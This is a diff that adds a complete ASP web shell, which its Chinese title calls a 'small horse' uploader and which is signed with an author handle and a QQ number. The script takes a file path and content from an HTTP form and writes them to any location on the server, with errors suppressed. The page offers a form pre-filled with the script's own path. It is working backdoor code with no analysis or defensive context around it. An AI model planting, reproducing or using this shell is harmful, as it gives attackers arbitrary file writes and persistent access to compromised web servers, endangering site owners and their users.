@@ -1,0 +1,27 @@
+<Title>′Mua 吥棄℡专用ASP小马</Title>
+<%Dim objfSo%>
+<%Dim fdata%>
+<%Dim objCountFile%>
+<%on error resume next%>
+<%Set objfSo = Server.CreateObject("Scripting.fileSystemObject")%>
+<%if Trim(request("syfdpath"))<>"" then%>
+<%fdata = request("cyfddata")%>
+<%Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)%>
+<%objCountFile.Write fdata%>
+<%if err =0 then%>
+OK!</font>
+<%else%>
+NO!</font>
+<%end if%>
+<%err.clear%>
+<%end if%>
+<%objCountFile.Close%>
+<%Set objCountFile=Nothing%>
+<%Set objFSO = Nothing%>
+<form action='' method=pOsT>
+PATH:</font><br>
+<input type=text name=syfdpath width=32 value="<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>" style="border:solid 1px" size=40><br>
+GUT:<br>
+<textarea name=cyfddata cols=39 rows=10 width=80 style="border:solid 1px"></textarea>
+<br><input type=submit value=SAVE style="border:solid 1px">
+</form>by:′Mua 吥棄℡ QQ:183037
